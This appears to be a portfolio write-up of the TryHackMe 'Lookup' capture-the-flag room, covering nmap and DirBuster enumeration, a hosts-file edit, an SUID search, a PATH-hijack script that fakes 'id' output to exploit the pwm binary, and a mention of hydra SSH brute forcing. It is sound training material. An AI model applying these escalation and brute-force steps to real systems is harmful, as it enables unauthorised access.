# 🔍 TryHackMe - Lookup

**Room:** Lookup  
**Platform:** TryHackMe  
**Focus:** Enumeration, Web Exploitation, Privilege Escalation  
**Difficulty:** Easy/Medium  
**Status:** Completed ✅

---

## 🧭 Enumeration

Performed initial enumeration with Nmap:
```bash
nmap -sC -sV -p- <IP>
```

Identified open ports for SSH and HTTP.

Used **DirBuster** with the wordlist `apache-user-enum-1.txt` to enumerate directories and potential usernames.

📸 ![DirBuster Enumeration](../screenshots/lookup/1.png)

Found `jose` as a valid user.

📸 ![Valid User Found](../screenshots/lookup/2.png)

---

## 🔐 Web Login and Hostname Discovery

Navigated to the login page on the web server. Upon login, was redirected to:

```text
files.lookup.thm/
```

Added this domain to `/etc/hosts` for local name resolution.

📸 ![Login Redirect](../screenshots/lookup/3.png)

📸 ![Updated Hosts File](../screenshots/lookup/4.png)

---

## 🗂️ File Navigation Post-Login

After successful login, accessed the internal file management page.

📸 ![File Page After Login](../screenshots/lookup/5.png)

Attempted to access `/home/think`, but permission was denied.

📸 ![Permission Denied on Home](../screenshots/lookup/6.png)

---

## 🔍 Privilege Escalation

Ran a search to find SUID binaries:

```bash
find / -perm /4000 2>/dev/null
```

📸 ![SUID Check](../screenshots/lookup/7.png)

Discovered `/usr/sbin/pwm` as an exploitable SUID binary.

Crafted a malicious `id` script in `/tmp/` and modified the `PATH`:

```bash
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
/usr/sbin/pwm
```

📸 ![PATH Hijack](../screenshots/lookup/8.png)

Successfully escalated privileges.

---

## 🔓 SSH Brute Forcing

Performed SSH brute-force login attempts using `hydra`.

📸 ![SSH Brute Force](../screenshots/lookup/9.png)

---

## 🎯 Post-Exploitation

Accessed the user’s home directory and retrieved the `user.txt` flag.

📸 ![User Flag Found](../screenshots/lookup/10.png)

---

## 🧠 Lessons Learned

- Importance of enum tools like DirBuster and Nmap in early-stage recon
- DNS redirection handling using `/etc/hosts`
- Creative SUID exploitation via `$PATH` manipulation
- Brute-forcing SSH credentials after valid user discovery

---

## 📁 Screenshots

Screenshots from the attack chain are stored in the [`../screenshots/lookup/`](../screenshots/lookup/) directory.

---

📁 [Back to TryHackMe Write-Ups](./README.md) | [Back to Portfolio Home](../README.md)
